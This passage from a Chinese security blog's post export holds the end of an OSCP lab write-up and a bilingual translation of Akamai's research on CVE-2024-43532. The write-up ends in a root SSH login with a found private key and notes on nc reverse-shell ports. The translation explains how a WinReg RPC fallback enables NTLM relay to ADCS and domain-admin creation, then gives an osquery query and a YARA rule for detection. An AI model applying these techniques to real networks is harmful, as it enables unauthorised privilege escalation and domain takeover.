cassie cassie 1823 Aug 2 16:40 id_rsacassie@clue:~$ ssh -i id_rsa -l root 127.0.0.1The authenticity of host &#x27;127.0.0.1 (127.0.0.1)&#x27; can&#x27;t be established....Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64...root@clue:~# iduid=0(root) gid=0(root) groups=0(root) 反思如果&#x2F;home&#x2F;cassie目录下没有id_rsa文件，我还能成功吗？ 难 我为什么没有得到freeswitch的交互式shell 这次深刻体会到了前人经验中所说的：机器上开放了哪些端口，nc 反弹shell就是用哪些端口，测试8021和80能成功，其他端口都可以 使用443端口时会返回timeout，而这个timeout实际是因为expolit.py中设置了5s的超时，而不是服务器主动断开的，当时让我有即使我反弹成功了，5s后也会断开的错觉，没有继续尝试 exploit代码一定得好好读，弄清楚原理 忽略了cassie的密码这样的重要信息，一定得细致，收集信息是关键 在使用freeswitch读取anthoy&#x2F;.bash_history没有权限之后，即使在使用cassia sudo 能读取全部文件之后，我大概率会忽略这个文件，因为心理暗示自己已经查看过来，是自己的大忌，总想着先排除一些信息，把问题缩小，以后一定得注意在获取新的账号权限后，把之前的信息收集再做一次","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"CVE-2024-43532-译","date":"2024-11-10T12:51:11.000Z","path":"post/20241110205111.html","text":"简述： Microsoft Remote Registry Service是Windows操作系统中的一个服务，允许远程用户通过网络访问和修改计算机上的注册表。 由于Microsoft Remote Registry客户端在SMB传输不可用的情况下回退到RPC认证时，切换到较旧的协议并采用弱认证级别，该级别无法验证通信的完整性或来源，攻击者可利用该缺陷，通过拦截 NTLM 身份验证握手并将其中继到其他服务，实现NTLM中继攻击，进而可能创建域管理员账户或 接管整个域 。 影响范围：所有运行Windows Server版本的操作系统，包括2008到2022版及Window 10&#x2F;11。 POC: https://github.com/akamai/akamai-security-research/tree/main/PoCs/cve-2024-43532 Call and Register — Relay Attack on WinReg RPC Client调用并注册——WinReg RPC 客户端的中继攻击 原文：https://www.akamai.com/blog/security-research/winreg-relay-vulnerability Executive summary 执行摘要 Akamai 研究员 Stiv Kupchik 在 Microsoft 远程注册表客户端中发现了一个新的特权提升 (EoP) 漏洞 CVE-2024-43532，CVSS 评分为 8.8。 该漏洞滥用 WinReg 客户端实现中的后备机制，如果 SMB 传输不可用，该机制将不安全地使用过时的传输协议。 通过利用此漏洞，攻击者可以将客户端的 NTLM 身份验证详细信息中继到 Active Directory 证书服务 (ADCS)，并请求用户证书以在域中进行进一步身份验证。我们在 GitHub存储库中提供了概念证明。 该漏洞已于 2024 年 2 月负责任地向 Microsoft 安全资源中心披露，并作为 2024 年 10 月补丁星期二的一部分进行了修补。 该漏洞影响所有未修补的 Windows 版本。 我们的研究结果也在 No Hat 计算机安全会议上公布。 Introduction介绍MS-RPC 是 Microsoft 对远程过程调用 (RPC) 协议和标准的实现。 RPC 是一种进程间通信机制，允许进程公开其他进程可以调用的功能。它是 Windows 操作系统的核心组件，多种服务都依赖于它 — 从服务管理器到 wininit 中的关闭。 我们的团队对 MS-RPC 进行了大量研究，包括攻击性研究（我们发现了缓存攻击形式的大型攻击向量）和防御性研究（我们分析了其安全机制）。 这一次，我们想从不同的角度来看待 RPC。任何允许不同计算机之间进行通信和操作的协议都必须涉及用户身份验证，实际上 RPC 协议支持传递凭据和身份验证作为其绑定过程的一部分。然而，只要有身份验证，就有身份验证中继的潜力，因此我们开始寻找中继机会。 RPC, authentication, and what’s in betweenRPC、身份验证以及介于两者之间的内容RPC sessions are handled by bindings . A client application connects to a server application, binds to the required RPC interface, and requests to run a specific function (Figure 1).RPC 会话由绑定处理。客户端应用程序连接到服务器应用程序，绑定到所需的 RPC 接口，并请求运行特定功能（图 1）。 Fig. 1: The basic RPC call process 图1：基本的RPC调用流程 The bind request and response can carry over multiple fields of data, as required for the connection. Normally, if there’s no authentication involved, the RPC binding is simply used to decide on the transfer syntax that will be used to encapsulate function parameters on subsequent calls.绑定请求和响应可以根据连接的需要携带多个数据字段。通常，如果不涉及身份验证，则 RPC 绑定仅用于决定将用于封装后续调用中的函数参数的传输语法。 What’s missing from this interaction? Authentication, of course! How can the server know the client’s identity and whether that client is allowed to perform the requested action? The answer is: It doesn’t, unless the client specifically added security context (authentication) to the binding. By default, all RPC connections are unauthenticated, and not all RPC servers actually require authentication.这种互动缺少什么？当然是认证啦！服务器如何知道客户端的身份以及是否允许该客户端执行请求的操作？答案是：不会，除非客户端专门向绑定添加了安全上下文（身份验证）。默认情况下，所有 RPC 连接都未经身份验证，并且并非所有 RPC 服务器实际上都需要身份验证。 To authenticate (or, in RPC terms, “add security context”), the client has to add additional data to the binding request, negotiate authentication protocol (for example, NTLM or Kerberos), and insert additional metadata required by the authentication protocol (like username, domain, etc.; Figure 2).为了进行身份验证（或者用 RPC 术语来说，“添加安全上下文”），客户端必须向绑定请求添加其他数据、协商身份验证协议（例如 NTLM 或 Kerberos），并插入身份验证协议所需的其他元数据（如用户名、域等；图 2)。 Fig 2: Authentication metadata added to RPC binding request图 2：添加到 RPC 绑定请求的身份验证元数据 Finding research targets寻找研究目标The first order of business is understanding how authentication should look from an API standpoint. This is done by a call to one of the RpcBindingSetAuthInfo* functions from the client after creating a binding handle. If you look at the documentation of these functions, you’ll notice a field called AuthenticationLevel; it indicates the level of security the authentication provides.第一个任务是从 API 的角度理解身份验证应该如何看待。这是通过在创建绑定句柄后从客户端调用 RpcBindingSetAuthInfo* 函数之一来完成的。如果您查看这些函数的文档，您会注意到一个名为 AuthenticationLevel 的字段；它指示身份验证提供的安全级别。 Security with authentication is more than just verifying that the user exists and is authorized, it can also be used to prevent tampering. The authentication levels vary from simply verifying the connection succeeded (RPC_C_AUTHN_LEVEL_CONNECT) to fully encrypting and signing all the traffic to ensure nothing is tampered (RPC_C_AUTHN_LEVEL_PKT_PRIVACY). Of course, attackers would be interested in the former level, no defenses on the traffic, which means it’s tamperable.身份验证的安全性不仅仅是验证用户存在和授权，它还可以用于防止篡改。身份验证级别各不相同，从简单地验证连接是否成功 (RPC_C_AUTHN_LEVEL_CONNECT) 到完全加密和签署所有流量以确保任何内容不被篡改 (RPC_C_AUTHN_LEVEL_PKT_PRIVACY)。当然，攻击者会对前一个级别感兴趣，对流量没有防御，这意味着它是可篡改的。 Yet the story isn’t so simple. RPC relay attacks are not a new concept, so a lot of the RPC clients and servers in Windows were already patched to use the highest level of authentication to ensure relay attacks can’t succeed. We’ll need to scour the operating system in hopes of finding some older nuggets of code that are still insecure for some reason (Figure 3).然而故事并不那么简单。 RPC 中继攻击并不是一个新概念，因此 Windows 中的许多 RPC 客户端和服务器已经打了补丁，以使用最高级别的身份验证来确保中继攻击不会成功。我们需要搜索操作系统，希望找到一些由于某种原因仍然不安全的旧代码块（图 3）。 Fig. 3: Running an IDAPython script on the system32 folder of a Windows server to find instances of RPC insecure authentication; the script can be found in our GitHub repository图 3：在 Windows 服务器的 system32 文件夹上运行 IDAPython 脚本以查找 RPC 不安全身份验证的实例；该脚本可以在我们的 GitHub 存储库中找到 WinReg — A promising candidateWinReg——一个有前途的候选者As suspected, the list of potential targets that we found included less than 5% of the total RPC servers and clients; most simply do not use insecure authentication anymore. But we found a promising candidate in advapi32.dll .正如所怀疑的，我们发现的潜在目标列表中不到 RPC 服务器和客户端总数的 5%；最简单的是不再使用不安全的身份验证。但我们在 advapi32.dll 中找到了一个有前途的候选者。 advapi32.dll is a core component of Windows API, and implements a lot of the “advanced” logic in Windows (as its name suggests). It exports more than 800 functions from various fields: event logging, encryption, WMI, and more.advapi32.dll是Windows API的核心组件，实现了Windows中的许多“高级”逻辑（顾名思义）。它导出来自各个领域的 800 多个功能：事件记录、加密、WMI 等。 For our purposes, we’ve found that, on some occasions, the internal function BaseBindToMachine calls RpcBindingSetAuthInfoA with an authentication level of RPC_C_AUTHN_LEVEL_CONNECT, which is what we want. BaseBindToMachine is called by the exported (though undocumented) function RegConnectRegistryExW (Figure 4), if it receives a UNC path for a machine name.出于我们的目的，我们发现，在某些情况下，内部函数 BaseBindToMachine 会使用 RPC_C_AUTHN_LEVEL_CONNECT 的身份验证级别调用 RpcBindingSetAuthInfoA，这正是我们想要的。如果 BaseBindToMachine 收到计算机名称的 UNC 路径，则由导出的（尽管未记录的）函数 RegConnectRegistryExW（图 4）调用它。 Fig. 4: The Rust documentation for RegConnectRegistryExW, as it is undocumented in MSDN图 4：RegConnectRegistryExW 的 Rust 文档，因为 MSDN 中没有记录它 By looking at BaseBindToMachine , we can see that it actually contains calls to both RpcBindingSetAuthInfoW and RpcBindingSetAuthInfoA . The former is used securely, with authentication level RPC_C_AUTHN_LEVEL_PKT_PRIVACY, while the latter uses authentication level RPC_C_AUTHN_LEVEL_CONNECT, which can be relayed as it doesn’t verify authenticity or integrity of the connection (Figure 5).通过查看BaseBindToMachine，我们可以看到它实际上包含对RpcBindingSetAuthInfoW和RpcBindingSetAuthInfoA的调用。前者使用安全，身份验证级别为 RPC_C_AUTHN_LEVEL_PKT_PRIVACY，而后者使用身份验证级别 RPC_C_AUTHN_LEVEL_CONNECT，可以中继，因为它不验证连接的真实性或完整性（图 5）。 Fig. 5: The two calls to set authentication info图 5：设置身份验证信息的两次调用 We just need to figure out why there are two conflicting calls. Looking at the function logic, we can see that it has a function pointer variable and an array of functions (Figure 6). Those functions set the RPC binding info to use a specific RPC transport; by default it attempts to use SMB and named pipes — but, if it fails, it attempts to bind over SPX, TCP&#x2F;IP, and others.我们只需要弄清楚为什么会有两个相互冲突的调用。查看函数逻辑，我们可以看到它有一个函数指针变量和一个函数数组（图6）。这些函数设置 RPC 绑定信息以使用特定的 RPC 传输；默认情况下，它会尝试使用 SMB 和命名管道，但如果失败，它会尝试通过 SPX、TCP&#x2F;IP 等进行绑定。 For some reason, once it falls back to any other protocol besides SMB, it uses RpcBindingSetAuthInfoA to set the authentication level to Connect, which is insecure.由于某种原因，一旦它回退到 SMB 之外的任何其他协议，它就会使用 RpcBindingSetAuthInfoA 将身份验证级别设置为 Connect，这是不安全的。 Fig. 6: Function pointers and the function array inside BaseBindToMachine图 6：BaseBindToMachine 内的函数指针和函数数组 The fallback to TCP&#x2F;IP is quite promising, as it means we can use the insecure authentication method to relay the traffic using a machine-in-the-middle attack without the client noticing. While it is possible with the other transport protocols as well, they are quite obsolete, so it might be unrealistic to find them in a modern network (and using them might trigger some alarm bells). TCP&#x2F;IP is a lot more common as an RPC transport, so it should be okay even in a red team setting.TCP&#x2F;IP 的回退是非常有前途的，因为这意味着我们可以使用不安全的身份验证方法，通过中间机器攻击来中继流量，而无需客户端注意。虽然其他传输协议也是可能的，但它们已经过时了，因此在现代网络中找到它们可能是不现实的（并且使用它们可能会触发一些警钟）。 TCP&#x2F;IP 作为 RPC 传输更为常见，因此即使在红队环境中也应该没问题。 It is important to know that both BaseBindToMachine and *RegConnectRegistryExW *accept a flag as an argument that prevents the fallback behavior, but the basic function RegConnectRegistryW calls *RegConnectRegistryExW *without that flag present.重要的是要知道 BaseBindToMachine 和 RegConnectRegistryExW 都接受一个标志作为防止回退行为的参数，但基本函数 RegConnectRegistryW 在没有该标志的情况下调用 RegConnectRegistryExW。 The relay process中继过程Relaying is quite simple since NTLM relay is a common technique. Most of the logic we need is already implemented in Impacket’s ntlmrelayx, which is what we’ll use the most.中继非常简单，因为 NTLM 中继是一种常用技术。我们需要的大部分逻辑已经在 Impacket 的 ntlmrelayx 中实现，这也是我们最常用的。 Building the RPC relay server构建RPC中继服务器What ntlmrelayx lacks is a TCP&#x2F;IP RPC server, as it implemented only an SMB server. As such, we’ll need to build our own relay server, which rejects the winreg named pipe to trigger a fallback to the TCP&#x2F;IP binding function.ntlmrelayx 缺少的是 TCP&#x2F;IP RPC 服务器，因为它只实现了 SMB 服务器。因此，我们需要构建自己的中继服务器，该服务器拒绝 winreg 命名管道以触发 TCP&#x2F;IP 绑定功能的回退。 There are three critical points we need to implement:我们需要实施三个关键点： The RPC endpoint mapperRPC端点映射器 The RPC bind request with NTLM与 NTLM 的 RPC 绑定请求 The NTLM challengeNTLM 挑战 The RPC endpoint mapper is responsible for translating RPC interface UUIDs into their respective endpoints, which in the case of the TCP&#x2F;IP transport, would be a port number. Unlike SMB, where the endpoints are named pipes that are unique and can be known in advance, the TCP endpoints use ephemeral ports, so another layer of translation is necessary.RPC 端点映射器负责将 RPC 接口 UUID 转换为其各自的端点，在 TCP&#x2F;IP 传输的情况下，这将是端口号。与 SMB 不同，SMB 的端点是唯一且可以提前知道的命名管道，而 TCP 端点使用临时端口，因此需要另一层转换。 The critical part is the NTLM-related issues. The way RPC binding works with NTLM is that an NTLM negotiation message is sent during the bind request, then an NTLM challenge is sent with the bind response. Finally, the client has to send another message, called AUTH3, with the challenge response (Figure 7).关键部分是NTLM相关问题。 RPC 绑定与 NTLM 结合使用的方式是，在绑定请求期间发送 NTLM 协商消息，然后随绑定响应一起发送 NTLM 质询。最后，客户端必须发送另一条名为 AUTH3 的消息以及质询响应（图 7）。 Fig. 7: NTLM authentication over RPC binding图 7：通过 RPC 绑定进行 NTLM 身份验证 To relay, we just have to parse the corresponding messages in our RPC server. Once we see an NTLM negotiate message in a bind message, we open our own connection to our target authentication server and also request to authenticate via NTLM. Then, we just have to capture the challenge the server sends us, relay it back to the victim, and relay the response back to the server to get our own authenticated session.要进行中继，我们只需在 RPC 服务器中解析相应的消息即可。一旦我们在绑定消息中看到 NTLM 协商消息，我们就会打开与目标身份验证服务器的连接，并请求通过 NTLM 进行身份验证。然后，我们只需捕获服务器发送给我们的质询，将其转发回受害者，并将响应转发回服务器以获得我们自己的经过身份验证的会话。 All we need to consider is which server we want to relay the authentication.我们需要考虑的是我们想要中继身份验证的服务器。 RPC to RPC relayRPC 到 RPC 中继The immediate thought would be to relay to another RPC server on a different machine, like the service manager or the task scheduler, and achieve a remote code execution that way. The issue with this, however, is that no one uses insecure authentication via RPC anymore, so we can’t relay to any high-profile RPC server. (This lack of insecure authentication via RPC is the same reason we had limited research targets.)最直接的想法是中继到不同机器上的另一个 RPC 服务器，例如服务管理器或任务调度程序，并以这种方式实现远程代码执行。然而，这样做的问题是，没有人再通过 RPC 使用不安全的身份验证，因此我们无法中继到任何高调的 RPC 服务器。 （缺乏通过 RPC 进行的不安全身份验证与我们研究目标有限的原因相同。） Both the service manager and the task scheduler RPC servers require RPC_C_AUTHN_LEVEL_PKT_PRIVACY, which encrypts the entirety of the traffic with the client’s NTLMv2 hash, which we don’t know even with the relay. Instead, we have to look at a different angle.服务管理器和任务调度程序 RPC 服务器都需要 RPC_C_AUTHN_LEVEL_PKT_PRIVACY，它使用客户端的 NTLMv2 哈希加密整个流量，即使使用中继，我们也不知道该哈希。相反，我们必须换个角度来看。 RPC to ADCSRPC 到 ADCSLuckily, the guys at SpecterOps have done a lot of work on ADCS; specifically on NTLM relay to ADCS. This is also implemented in Impacket by default, so all we have to do is pass our authenticated session to Impacket’s HTTPAttack module and let the magic happen by itself.幸运的是，SpectreOps 的人员在 ADCS 方面做了很多工作；特别是关于 ADCS 的 NTLM 中继。默认情况下，这也在 Impacket 中实现，因此我们所要做的就是将经过身份验证的会话传递给 Impacket 的 HTTPAttack 模块，然后让魔法自行发生。 ADCS’s HTTP web server doesn’t require any security and is vulnerable to relay attacks. By abusing that, once we authenticate to it, we can request a user certificate, which we can then use by itself to authenticate, without having to go through the trouble of relaying the authentication again (Figure 8).ADCS 的 HTTP Web 服务器不需要任何安全性，并且容易受到中继攻击。通过滥用这一点，一旦我们对其进行身份验证，我们就可以请求用户证书，然后我们可以使用该证书本身进行身份验证，而无需再次经历中继身份验证的麻烦（图 8）。 Fig 8: Requesting and receiving a certificate from ADCS following an NTLM relay attack图8：NTLM继电器攻击后请求并收到ADC的证书 We used this certificate to authenticate to the LDAP service on the domain controller and create a persistent new domain admin in the compromised domain (Figure 9).我们使用此证书对域控制器上的 LDAP 服务进行身份验证，并在受感染的域中创建持久的新域管理员（图 9）。 Fig 9: Creating a new domain admin using an LDAP shell图 9：使用 LDAP shell 创建新的域管理员 Potential impact潜在影响A function in advapi isn’t interesting by itself, it is only impactful if something else is using it. A quick lookup of imports of RegConnectRegistryExW or RegConnectRegistryExA doesn’t show anything on an up-to-date domain controller, but a search for RegConnectRegistryW uncovers a lot of potential candidates, like certutil and certsrv (AD CS), EFS, DFS, and more.advapi 中的函数本身并不有趣，只有当其他东西使用它时它才会产生影响。快速查找 RegConnectRegistryExW 或 RegConnectRegistryExA 的导入不会在最新的域控制器上显示任何内容，但搜索 RegConnectRegistryW 会发现许多潜在的候选者，例如 certutil 和 certsrv (AD CS)、EFS、DFS 和更多的。 Detection检测The Remote Registry service isn’t enabled by default on all Windows machines. It is possible to detect it’s status using the following osquery:默认情况下，并非所有 Windows 计算机上都启用远程注册表服务。可以使用以下 osquery 检测其状态： 1SELECT display_name, status, start_type, pid FROM services WHERE name=&#x27;RemoteRegistry&#x27; This, however, doesn’t protect from CVE-2024-43532, as it is a client issue. The results of the query should raise actual use cases for the Remote Registry in the organization that you might need to account for when hardening your systems.然而，这并不能防止 CVE-2024-43532，因为这是一个客户端问题。查询结果应提出组织中远程注册表的实际用例，您在强化系统时可能需要考虑这些用例。 To detect clients that use any of the vulnerable WinAPI, you can use the following YARA rule:要检测使用任何易受攻击的 WinAPI 的客户端，您可以使用以下 YARA 规则： 1234567891011121314import&quot;pe&quot;rule winreg_client_import &#123; meta: description = &quot;Detect binaries that rely on RegConnectRegistry&quot; author = &quot;Stiv Kupchik with Akamai Technologies&quot; condition: pe.is_pe and ( pe.imports(pe.IMPORT_ANY, &quot;advapi32.dll&quot;, &quot;RegConnectRegistryA&quot;)or pe.imports(pe.IMPORT_ANY, &quot;advapi32.dll&quot;, &quot;RegConnectRegistryW&quot;)or pe.imports(pe.IMPORT_ANY, &quot;advapi32.dll&quot;, &quot;RegConnectRegistryExA&quot;)or pe.imports(pe.IMPORT_ANY, &quot;advapi32.dll&quot;, &quot;RegConnectRegistryExW&quot;) ) &#125; Akamai Guardicore Segmentation users can also create policy rules for traffic coming into the RemoteRegistry service (Figure 10).Akamai Guardicore Segmentation 用户还可以为进入 RemoteRegistry 服务的流量创建策略规则（图 10）。 Fig. 10: Segmentation policy rule to alert on traffic to the RemoteRegistry service图 10：针对 RemoteRegistry 服务的流量发出警报的分段策略规则 It is also possible to use Event Tracing for Windows (ETW) to monitor RPC traffic on both client and server sides of the communication. We’ve elaborated on this topic in our presentation at Black Hat 2023 and its accompanying blog post. Users can use our RPC visibility open-source tool to track RPC calls and filter for the WinReg RPC interface UUID {338cd001-2244-31f1-aaaa-900038001003} .还可以使用 Windows 事件跟踪 (ETW) 来监视通信客户端和服务器端的 RPC 流量。我们在 Black Hat 2023 的演讲及其随附的博客文章中详细阐述了这个主题。用户可以使用我们的 RPC 可见性开源工具来跟踪 RPC 调用并过滤 WinReg RPC 接口 UUID {338cd001-2244-31f1-aaaa-900038001003}。 Conclusion结论Although the RPC protocol — and MS-RPC — were built with security in mind, we can clearly see the evolution of security principles over time by analyzing various RPC interface implementations. While most RPC servers and clients are secure nowadays, it is possible, from time to time, to uncover relics of insecure implementation to varying degrees.尽管 RPC 协议和 MS-RPC 在构建时就考虑到了安全性，但通过分析各种 RPC 接口实现，我们可以清楚地看到安全原则随时间的演变。虽然现在大多数 RPC 服务器和客户端都是安全的，但有时仍可能会不同程度地发现不安全实现的遗留问题。 In this case, we managed to achieve NTLM relay, which is a class of attacks that better belongs to the past. This just proves that network defenses must be as thorough as possible because you never know which ancient interface is still exposed or running.在这种情况下，我们成功实现了 NTLM 中继，这是一类更好地属于过去的攻击。这恰恰证明网络防御必须尽可能彻底，因为你永远不知道哪个古老的接口仍然暴露或运行。","categories":[{"name":"How It Works-临渊羡鱼","slug":"How-It-Works-临渊羡鱼","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/"},{"name":"CVE","slug":"How-It-Works-临渊羡鱼/CVE","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/CVE/"},{"name":"译","slug":"How-It-Works-临渊羡鱼/CVE/译","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/CVE/%E8%AF%91/"}],"tags":[]}]